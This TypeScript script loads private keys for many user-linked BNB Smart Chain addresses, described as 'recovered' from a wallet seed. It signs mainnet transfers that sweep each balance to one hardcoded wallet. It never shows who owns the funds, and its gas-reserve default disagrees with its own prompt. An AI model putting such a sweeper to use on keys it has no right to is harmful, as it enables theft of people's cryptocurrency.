import Web3 from 'web3';
import fs from 'fs';
import path from 'path';
import readline from 'readline';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

/**
 * Transfer BNB from recovered addresses to a target wallet
 */

interface RecoveredAddressData {
  recoveredAt: string;
  walletSeed: string;
  totalRecovered: number;
  totalBNB: number;
  addresses: Array<{
    userId: number;
    address: string;
    privateKey: string;
    bnbBalance: number;
  }>;
}

interface TransferResult {
  userId: number;
  address: string;
  status: string;
  txHash?: string;
  amount?: number;
  reason?: string;
  error?: string;
}

class BNBTransfer {
  private web3: Web3;
  private recoveredData: RecoveredAddressData | null = null;

  constructor() {
    // Use BSC Mainnet RPC endpoints (NOT testnet)
    const rpcUrls = [
      "https://bsc-dataseed.binance.org/",
      "https://bsc-dataseed1.defibit.io/",
      "https://bsc-dataseed1.ninicoin.io/",
    ];
    const rpcUrl = rpcUrls[0];
    this.web3 = new Web3(rpcUrl);
    console.log('BNB Transfer Tool initialized');
    console.log(`Using RPC: ${rpcUrl}`);
    console.log('Network: BSC Mainnet\n');
  }

  /**
   * Load recovered addresses from file
   */
  loadRecoveredAddresses(filePath: string): void {
    try {
      const content = fs.readFileSync(filePath, 'utf-8');
      this.recoveredData = JSON.parse(content);
      console.log(`✓ Loaded ${this.recoveredData!.totalRecovered} recovered addresses`);
      console.log(`  Total BNB: ${this.recoveredData!.totalBNB.toFixed(6)}`);
      console.log(`  Wallet Seed: ${this.recoveredData!.walletSeed}\n`);
    } catch (error) {
      console.error('Error loading recovered addresses:', error);
      throw error;
    }
  }

  /**
   * Validate target address
   */
  private validateAddress(address: string): boolean {
    return this.web3.utils.isAddress(address);
  }

  /**
   * Transfer BNB from a single address
   */
  private async transferFromAddress(
    privateKey: string,
    toAddress: string,
    amount: string,
    gasPrice: string,
    nonce: number
  ): Promise<{ success: boolean; txHash?: string; error?: string }> {
    try {
      const fromAccount = this.web3.eth.accounts.privateKeyToAccount(privateKey);
      
      const txData = {
        from: fromAccount.address,
        to: toAddress,
        value: this.web3.utils.toWei(amount, 'ether'),
        gas: '21000',
        gasPrice: gasPrice,
        nonce: nonce
      };

      const signedTx = await fromAccount.signTransaction(txData);
      const receipt = await this.web3.eth.sendSignedTransaction(signedTx.rawTransaction as string);

      const txHash = typeof receipt.transactionHash === 'string'
        ? receipt.transactionHash
        : this.web3.utils.bytesToHex(receipt.transactionHash);

      return { success: true, txHash };
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Batch transfer BNB to target address
   */
  async batchTransfer(
    toAddress: string,
    leaveGasFee: number = 0.0001,
    delayMs: number = 2000
  ): Promise<TransferResult[]> {
    if (!this.recoveredData) {
      throw new Error('No recovered addresses loaded');
    }

    if (!this.validateAddress(toAddress)) {
      throw new Error(`Invalid target address: ${toAddress}`);
    }

    const results: TransferResult[] = [];
    const addresses = this.recoveredData.addresses;
    
    console.log(`Starting transfer to: ${toAddress}`);
    console.log(`Leaving ${leaveGasFee} BNB for gas fees\n`);

    // Get gas price once
    const gasPrice = await this.web3.eth.getGasPrice();
    console.log(`Current gas price: ${this.web3.utils.fromWei(gasPrice, 'gwei')} Gwei\n`);

    for (let i = 0; i < addresses.length; i++) {
      const addr = addresses[i];
      const transferAmount = Math.max(0, addr.bnbBalance - leaveGasFee);

      if (transferAmount <= 0) {
        console.log(`[${i + 1}/${addresses.length}] Skipped ${addr.address} (insufficient balance)`);
        results.push({
          userId: addr.userId,
          address: addr.address,
          status: 'skipped',
          reason: 'insufficient_balance'
        });
        continue;
      }

      try {
        console.log(`[${i + 1}/${addresses.length}] Transferring ${transferAmount.toFixed(6)} BNB from ${addr.address}`);

        const nonce = await this.web3.eth.getTransactionCount(addr.address, 'pending');
        const result = await this.transferFromAddress(
          addr.privateKey,
          toAddress,
          transferAmount.toString(),
          gasPrice.toString(),
          Number(nonce)
        );

        if (result.success) {
          console.log(`  ✓ Success: ${result.txHash}`);
          results.push({
            userId: addr.userId,
            address: addr.address,
            status: 'success',
            txHash: result.txHash,
            amount: transferAmount
          });
        } else {
          console.log(`  ✗ Failed: ${result.error}`);
          results.push({
            userId: addr.userId,
            address: addr.address,
            status: 'failed',
            error: result.error
          });
        }

        // Delay between transactions
        if (i < addresses.length - 1) {
          await new Promise(resolve => setTimeout(resolve, delayMs));
        }
      } catch (error: any) {
        console.log(`  ✗ Error: ${error.message}`);
        results.push({
          userId: addr.userId,
          address: addr.address,
          status: 'error',
          error: error.message
        });
      }
    }

    return results;
  }

  /**
   * Print transfer summary
   */
  printTransferSummary(results: any[]): void {
    const successful = results.filter(r => r.status === 'success');
    const failed = results.filter(r => r.status === 'failed');
    const skipped = results.filter(r => r.status === 'skipped');
    const totalTransferred = successful.reduce((sum, r) => sum + (r.amount || 0), 0);

    console.log('\n' + '='.repeat(80));
    console.log('TRANSFER SUMMARY');
    console.log('='.repeat(80));
    console.log(`Total Transfers: ${results.length}`);
    console.log(`✓ Successful: ${successful.length}`);
    console.log(`✗ Failed: ${failed.length}`);
    console.log(`⊘ Skipped: ${skipped.length}`);
    console.log(`Total BNB Transferred: ${totalTransferred.toFixed(6)}`);
    console.log('='.repeat(80) + '\n');

    if (failed.length > 0) {
      console.log('Failed Transfers:');
      failed.forEach(r => {
        console.log(`  - ${r.address}: ${r.error}`);
      });
      console.log();
    }
  }

  /**
   * Save transfer results
   */
  saveResults(results: any[], outputPath: string): void {
    const output = {
      transferredAt: new Date().toISOString(),
      totalTransfers: results.length,
      successful: results.filter(r => r.status === 'success').length,
      failed: results.filter(r => r.status === 'failed').length,
      skipped: results.filter(r => r.status === 'skipped').length,
      results
    };

    fs.writeFileSync(outputPath, JSON.stringify(output, null, 2));
    console.log(`✓ Results saved to: ${outputPath}\n`);
  }
}

/**
 * Interactive prompt
 */
function createPrompt(): readline.Interface {
  return readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
}

async function askQuestion(rl: readline.Interface, question: string): Promise<string> {
  return new Promise(resolve => {
    rl.question(question, resolve);
  });
}

// Main execution
async function main() {
  console.log('╔════════════════════════════════════════════════════════════════════════════════╗');
  console.log('║                        BNB TRANSFER FROM RECOVERED                            ║');
  console.log('╚════════════════════════════════════════════════════════════════════════════════╝\n');

  const transfer = new BNBTransfer();
  const rl = createPrompt();

  try {
    // Load recovered addresses
    const recoveredFile = path.join(__dirname, 'recovered_addresses.json');
    
    if (!fs.existsSync(recoveredFile)) {
      console.error(`Error: ${recoveredFile} not found`);
      console.log('Please run quick-recover.ts first to generate recovered addresses\n');
      rl.close();
      process.exit(1);
    }

    transfer.loadRecoveredAddresses(recoveredFile);

    // Get target address
    const targetAddress = "0x17b6B0942F074907E52975eD44927996F6C27e88"
    
    if (!transfer['validateAddress'](targetAddress)) {
      console.error('Invalid address format');
      rl.close();
      process.exit(1);
    }

    // Get gas fee reservation
    const gasFeeStr = await askQuestion(rl, 'Leave BNB for gas fees (default 0.0001): ');
    const gasFee = gasFeeStr ? parseFloat(gasFeeStr) : 0.0005;

    // Confirm
    console.log(`\nTarget Address: ${targetAddress}`);
    console.log(`Gas Fee Reserve: ${gasFee} BNB`);
    const confirm = await askQuestion(rl, '\nProceed with transfer? (yes/no): ');

    if (confirm.toLowerCase() !== 'yes') {
      console.log('Transfer cancelled');
      rl.close();
      process.exit(0);
    }

    rl.close();

    // Execute transfer
    const results = await transfer.batchTransfer(targetAddress, gasFee);

    // Print summary
    transfer.printTransferSummary(results);

    // Save results
    const resultsFile = path.join(__dirname, 'transfer_results.json');
    transfer.saveResults(results, resultsFile);

    console.log('✓ Transfer complete!');
    console.log(`  Check ${resultsFile} for detailed results\n`);

  } catch (error) {
    console.error('Fatal error:', error);
    rl.close();
    process.exit(1);
  }
}

main().catch(console.error);
